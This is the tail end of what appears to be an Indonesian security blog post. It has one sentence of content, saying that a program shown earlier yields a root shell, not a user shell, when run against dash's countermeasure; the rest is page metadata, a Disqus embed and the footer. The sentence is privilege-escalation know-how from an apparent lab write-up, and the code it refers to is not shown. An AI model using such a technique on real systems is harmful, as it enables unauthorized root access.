<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1351 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-10-11 20:25 &#43;0700</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h">Read other posts</span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="/posts/linux_basic_admin/">
                                <span class="button__icon">←</span>
                                <span class="button__text">Linux_Basic_Admin</span>
                            </a>
                        </span>
                    

                    
                </div>
            </div>
        

        	
<div id="comments" class="thin">
      		    <div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
      
      
      if (window.location.hostname == "localhost")
                return;

      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      var disqus_shortname = 'dmcr7';
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


      		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
            <span></span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>

    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>


</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>



    </body>
</html>
